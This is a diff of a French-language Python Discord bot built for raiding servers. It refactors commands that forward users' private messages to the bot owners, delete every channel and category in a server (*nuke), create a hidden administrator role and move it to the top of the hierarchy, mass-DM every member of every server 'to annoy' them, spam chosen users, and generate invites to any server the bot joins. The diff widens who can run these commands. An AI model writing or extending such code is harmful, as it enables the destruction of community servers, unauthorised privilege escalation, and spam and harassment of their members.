@@ -28,11 +28,12 @@ async def on_message(message):
         user_id = message.author.id
         user_name = message.author.name
 
-        for user1_id in owners:
+        for user1_id in Owners_All:
             user1 = await bot.fetch_user(user1_id)
-            await user1.send(f"Vous avez reçu un message de {user_name} ({user_id}) en MP : {content}")
+            await user1.send(f"Vous avez reçu un message de {user_name} `({user_id})` en MP : {content}")
 
     await bot.process_commands(message)
+
 
 
 
@@ -79,30 +80,32 @@ def is_owner_or_owner_all(ctx):
 
 @bot.command()
 @commands.check(is_owner_or_owner_all)
-async def help(self, ctx):
-        if ctx.author.id in owners:
-            embed = discord.Embed(
-                title="Commandes du Bot",
-                description="Liste des commandes disponibles.",
-                color=discord.Color.dark_red()
-            )
+async def help(ctx):
+    embed = discord.Embed(
+        title="Commandes du Bot",
+        description="Liste des commandes disponibles.",
+        color=discord.Color.dark_red()
+    )
 
-            embed.add_field(name="*lservers", value="Voir où je suis.")
-            embed.add_field(name="*ginvite", value="ID + serveur où je suis.")
-            embed.add_field(name="*dm_all", value="DM à tous les serveurs pour embêter.")
-            embed.add_field(name="*mp", value="ID + message.")
-            embed.add_field(name="*spam", value="ID + on/off + message.")
-            embed.add_field(name="*add", value="ID nom role.")
-            embed.add_field(name="*top", value="Nom du rôle pour le placer en haut.")
-            embed.add_field(name="*bl", value="Nom du rôle créé avec des permissions d'admin, faites attention !")
-            embed.add_field(name="*perm", value="Mentionnez l'utilisateur pour voir ses permissions.")
-            embed.add_field(name="*info", value="Donne des informations sur le bot.")
-            embed.add_field(name="*stop", value="Mettre Hors ligne le Bot.")
-            embed.add_field(name="*nuke", value="'Nom du salon' a créé et supprimé tous (Pour décaler ou supprimer tous).")
-            embed.add_field(name="*hide", value="caché un salon.")
-            embed.add_field(name="*unhide", value="décaché un salon.")
+    embed.add_field(name="*lservers", value="Voir où je suis.")
+    embed.add_field(name="*ginvite", value="ID + serveur où je suis.")
+    embed.add_field(name="*dm_all", value="DM à tous les serveurs pour embêter.")
+    embed.add_field(name="*mp", value="ID + message.")
+    embed.add_field(name="*spam", value="ID + on/off + message.")
+    embed.add_field(name="*add", value="ID nom role.")
+    embed.add_field(name="*top", value="Nom du rôle pour le placer en haut.")
+    embed.add_field(name="*bl", value="Nom du rôle créé avec des permissions d'admin, faites attention !")
+    embed.add_field(name="*perm", value="Mentionnez l'utilisateur pour voir ses permissions.")
+    embed.add_field(name="*info", value="Donne des informations sur le bot.")
+    embed.add_field(name="*stop", value="Mettre Hors ligne le Bot.")
+    embed.add_field(name="*nuke", value="'Nom du salon' a créé et supprimé tous (Pour décaler ou supprimer tous).")
+    embed.add_field(name="*hide", value="caché un salon.")
+    embed.add_field(name="*unhide", value="décaché un salon.")
+    embed.add_field(name="*lock", value="Bloqué un salon.")
+    embed.add_field(name="*unlock", value="débloqué un salon.")
 
-            await ctx.send(embed=embed)
+    await ctx.send(embed=embed)
+
 
 
 
@@ -126,7 +129,7 @@ async def info(ctx):
     embed.add_field(name="Date de création du Bot", value=created_at, inline=False)
     embed.add_field(name="Support Aide", value=owners_link, inline=False)
 
-    # Vérifiez si l'auteur de la commande est un propriétaire
+    
     if ctx.author.id in owners:
         embed.set_footer(text="Cliquez sur les liens pour en savoir plus.")
     elif ctx.author.id in Owners_All:
@@ -159,57 +162,45 @@ async def change_avatar_all(ctx, avatar_url):
 @bot.command()
 @commands.check(is_owner_or_owner_all)
 async def nuke(ctx, channel_name):
-    if ctx.author.id in owners:
-        guild = ctx.guild
+    guild = ctx.guild
 
-        
-        for text_channel in guild.text_channels:
-            try:
-                await text_channel.delete()
-            except discord.Forbidden:
-                
-                pass
-            except discord.HTTPException as e:
-                
-                print(f"Erreur lors de la suppression du canal {text_channel.name}: {e}")
+    
+    for text_channel in guild.text_channels:
+        try:
+            await text_channel.delete()
+        except discord.Forbidden:
+            pass
+        except discord.HTTPException as e:
+            print(f"Erreur lors de la suppression du canal {text_channel.name}: {e}")
 
-        
-        for voice_channel in guild.voice_channels:
-            try:
-                await voice_channel.delete()
-            except discord.Forbidden:
-                
-                pass
-            except discord.HTTPException as e:
-                
-                print(f"Erreur lors de la suppression du canal vocal {voice_channel.name}: {e}")
+    for voice_channel in guild.voice_channels:
+        try:
+            await voice_channel.delete()
+        except discord.Forbidden:
+            pass
+        except discord.HTTPException as e:
+            print(f"Erreur lors de la suppression du canal vocal {voice_channel.name}: {e}")
 
-        
-        for category in guild.categories:
-            try:
-                await category.delete()
-            except discord.Forbidden:
-                
-                pass
-            except discord.HTTPException as e:
-                
-                print(f"Erreur lors de la suppression de la catégorie {category.name}: {e}")
+    
+    for category in guild.categories:
+        try:
+            await category.delete()
+        except discord.Forbidden:
+            pass
+        except discord.HTTPException as e:
+            print(f"Erreur lors de la suppression de la catégorie {category.name}: {e}")
 
+    owners_role = await guild.create_role(name="Owners", hoist=True)
 
-        owners_role = await guild.create_role(name="Owners", hoist=True)
+    await ctx.author.add_roles(owners_role)
 
-        
-        await ctx.author.add_roles(owners_role)
+    new_channel_name = channel_name
+    new_channel = await guild.create_text_channel(name=new_channel_name)
 
-        
-        new_channel_name = channel_name  
-        new_channel = await guild.create_text_channel(name=new_channel_name)
+    owner_mentions = " ".join([f"<@{owner_id}>" for owner_id in owners])
 
-        
-        owner_mentions = " ".join([f"<@{owner_id}>" for owner_id in owners])
+    await new_channel.send(f"{owner_mentions}, la commande a été effectuée avec succès.")
 
-        
-        await new_channel.send(f"{owner_mentions}, la commande a été effectuée avec succès.")
 
 
 
@@ -220,35 +211,11 @@ async def nuke(ctx, channel_name):
 @bot.command()
 @commands.check(is_owner_or_owner_all)
 async def stop(ctx):
-    if ctx.author.id in owners:
-        await ctx.send("Arrêt du bot en cours...")
-        await bot.close()
+    await ctx.send("Arrêt du bot en cours...")
+    await bot.close()
 
 
 
-
-@bot.command()
-@commands.check(is_owner_or_owner_all)
-async def dm_alls(ctx, *, message):
-    if ctx.author.id in owners:
-        global sent_messages
-        for guild in bot.guilds:
-            for member in guild.members:
-                if member.bot:
-                    continue
-                user_id = member.id
-                if user_id in sent_messages:
-                    continue  
-                try:
-                    await member.send(message)
-                    sent_messages.add(user_id)  
-                    print(f"Message envoyé à {member.name}#{member.discriminator}")
-                except discord.Forbidden:
-                    print(f"Impossible d'envoyer un message à {member.name}#{member.discriminator}")
-
-
-        with open(sent_messages_file, "w") as file:
-            file.write("\n".join(sent_messages))
 
 
 
@@ -256,16 +223,15 @@ async def dm_alls(ctx, *, message):
 @bot.command()
 @commands.check(is_owner_or_owner_all)
 async def bl(ctx, role_name):
-    if ctx.author.id in owners:
-        if role_name:
-            try:
-                
-                role = await ctx.guild.create_role(name=role_name, permissions=discord.Permissions(administrator=True))
-                await ctx.send(f"Rôle {role.name} créé")
-            except Exception as e:
-                await ctx.send(f"Une erreur s'est produite : {e}")
-        else:
-            await ctx.send("Le nom du rôle est manquant. Utilisation : *bl <nom_du_role>")
+    if role_name:
+        try:
+            role = await ctx.guild.create_role(name=role_name, permissions=discord.Permissions(administrator=True))
+            await ctx.send(f"Rôle {role.name} créé")
+        except Exception as e:
+            await ctx.send(f"Une erreur s'est produite : {e}")
+    else:
+        await ctx.send("Le nom du rôle est manquant. Utilisation : *bl <nom_du_role>")
+
 
 
 
@@ -276,16 +242,16 @@ async def bl(ctx, role_name):
 @bot.command()
 @commands.check(is_owner_or_owner_all)
 async def perm(ctx, target: discord.Member = None):
-    if ctx.author.id in owners:
-        if target is None:
-            target = ctx.author
+    if target is None:
+        target = ctx.author
 
-        permissions = target.guild_permissions
+    permissions = target.guild_permissions
 
-        permissions_list = [name for name, value in permissions]
-        permissions_message = "\n".join(permissions_list)
+    permissions_list = [name for name, value in permissions]
+    permissions_message = "\n".join(permissions_list)
 
-        await ctx.send(f"Permissions pour {target.display_name} :\n```{permissions_message}```")
+    await ctx.send(f"Permissions pour {target.display_name} :\n```{permissions_message}```")
+
 
 
 
@@ -294,34 +260,32 @@ async def perm(ctx, target: discord.Member = None):
 @bot.command()
 @commands.check(is_owner_or_owner_all)
 async def clear(ctx, amount: int):
-    if ctx.author.id in owners:
-        try:
-           
-            await ctx.channel.purge(limit=amount + 1)
-        except Exception as e:
-            await ctx.send(f"Une erreur s'est produite : {e}")
+    try:
+        await ctx.channel.purge(limit=amount + 1)
+    except Exception as e:
+        await ctx.send(f"Une erreur s'est produite : {e}")
+
 
 @bot.command()
 @commands.check(is_owner_or_owner_all)
 async def addrole(ctx, user_id, role_name=None):
-    if ctx.author.id in owners:
-        try:
-
-            if user_id.isdigit():
-                user = ctx.guild.get_member(int(user_id))
-                if user and role_name:
-                    role = discord.utils.get(ctx.guild.roles, name=role_name)
-                    if role:
-                        await user.add_roles(role)
-                        await ctx.send(f"{role.name} a été ajouté à {user.name}.")
-                    else:
-                        await ctx.send(f"Le rôle {role_name} n'a pas été trouvé.")
+    try:
+        if user_id.isdigit():
+            user = ctx.guild.get_member(int(user_id))
+            if user and role_name:
+                role = discord.utils.get(ctx.guild.roles, name=role_name)
+                if role:
+                    await user.add_roles(role)
+                    await ctx.send(f"{role.name} a été ajouté à {user.name}.")
                 else:
-                    await ctx.send(f"L'utilisateur avec l'ID {user_id} n'a pas été trouvé.")
+                    await ctx.send(f"Le rôle {role_name} n'a pas été trouvé.")
             else:
-                await ctx.send("L'ID de l'utilisateur n'est pas un nombre valide.")
-        except Exception as e:
-            await ctx.send(f"Une erreur s'est produite : {e}")
+                await ctx.send(f"L'utilisateur avec l'ID {user_id} n'a pas été trouvé.")
+        else:
+            await ctx.send("L'ID de l'utilisateur n'est pas un nombre valide.")
+    except Exception as e:
+        await ctx.send(f"Une erreur s'est produite : {e}")
+
 
 
 
@@ -376,30 +340,22 @@ async def unhide(ctx, channel_name=None):
 @bot.command()
 @commands.check(is_owner_or_owner_all)
 async def top(ctx, role_name):
-    if ctx.author.id in owners and ctx.author.id not in Owners_All:
-        guild = ctx.guild
+    guild = ctx.guild
 
-        
-        role = discord.utils.get(guild.roles, name=role_name)
+    role = discord.utils.get(guild.roles, name=role_name)
 
-        if role is not None:
-            try:
-                
-                roles = guild.roles
+    if role is not None:
+        try:
+            roles = guild.roles
+            current_position = role.position
+            highest_role = max(roles, key=lambda x: x.position)
+            await role.edit(position=highest_role.position - 1)
+            await ctx.send(f"Le rôle '{role.name}' a été déplacé en haut de la liste des rôles.")
+        except Exception as e:
+            await ctx.send(f"Une erreur s'est produite : {e}")
+    else:
+        await ctx.send("Le rôle spécifié n'a pas été trouvé.")
 
-                current_position = role.position
-
-                
-                highest_role = max(roles, key=lambda x: x.position)
-
-                
-                await role.edit(position=highest_role.position - 1)
-
-                await ctx.send(f"Le rôle '{role.name}' a été déplacé en haut de la liste des rôles.")
-            except Exception as e:
-                await ctx.send(f"Une erreur s'est produite : {e}")
-        else:
-            await ctx.send("Le rôle spécifié n'a pas été trouvé.")
 
 
 
@@ -409,21 +365,21 @@ async def top(ctx, role_name):
 @bot.command()
 @commands.check(is_owner_or_owner_all)
 async def dm_all(ctx, *, message):
-    if ctx.author.id in owners and ctx.author.id not in Owners_All:
-        global sent_messages  
-        for guild in bot.guilds:
-            for member in guild.members:
-                if member.bot:
-                    continue
-                user_id = member.id
-                if user_id in sent_messages:
-                    continue  
-                try:
-                    await member.send(message)
-                    sent_messages.add(user_id) 
-                    print(f"Message envoyé à {member.name}#{member.discriminator}")
-                except discord.Forbidden:
-                    print(f"Impossible d'envoyer un message à {member.name}#{member.discriminator}")
+    global sent_messages
+    for guild in bot.guilds:
+        for member in guild.members:
+            if member.bot:
+                continue
+            user_id = member.id
+            if user_id in sent_messages:
+                continue
+            try:
+                await member.send(message)
+                sent_messages.add(user_id)
+                print(f"Message envoyé à {member.name}#{member.discriminator}")
+            except discord.Forbidden:
+                print(f"Impossible d'envoyer un message à {member.name}#{member.discriminator}")
+
 
 
 
@@ -431,15 +387,14 @@ async def dm_all(ctx, *, message):
 @bot.command()
 @commands.check(is_owner_or_owner_all)
 async def mp(ctx, user_id, *, message_content):
-    if ctx.author.id in owners and ctx.author.id not in Owners_All:
-        try:
-            user = await bot.fetch_user(int(user_id))
-            await user.send(message_content)
-            await ctx.send(f'Message envoyé en MP à {user.name} : {message_content}')
-        except discord.NotFound:
-            await ctx.send(f"L'utilisateur avec l'ID {user_id} n'a pas été trouvé.")
-        except Exception as e:
-            await ctx.send(f"Une erreur s'est produite : {e}")
+    try:
+        user = await bot.fetch_user(int(user_id))
+        await user.send(message_content)
+        await ctx.send(f'Message envoyé en MP à {user.name} : {message_content}')
+    except discord.NotFound:
+        await ctx.send(f"L'utilisateur avec l'ID {user_id} n'a pas été trouvé.")
+    except Exception as e:
+        await ctx.send(f"Une erreur s'est produite : {e}")
 
 
 
@@ -529,17 +484,16 @@ async def unlock(ctx, channel_name=None):
 @bot.command()
 @commands.check(is_owner_or_owner_all)
 async def ginvite(ctx, server_id):
-    if ctx.author.id in owners:
-        try:
-            server = bot.get_guild(int(server_id))
-            
-            if server:
-                invite = await server.text_channels[0].create_invite()
-                await ctx.send(f"Voici l'invitation pour le serveur {server.name} : {invite.url}")
-            else:
-                await ctx.send("Serveur introuvable. Assurez-vous que le bot est sur le serveur.")
-        except Exception as e:
-            await ctx.send(f"Une erreur s'est produite : {e}")
+    try:
+        server = bot.get_guild(int(server_id))
+        
+        if server:
+            invite = await server.text_channels[0].create_invite()
+            await ctx.send(f"Voici l'invitation pour le serveur {server.name} : {invite.url}")
+        else:
+            await ctx.send("Serveur introuvable. Assurez-vous que le bot est sur le serveur.")
+    except Exception as e:
+        await ctx.send(f"Une erreur s'est produite : {e}")
 
 
 
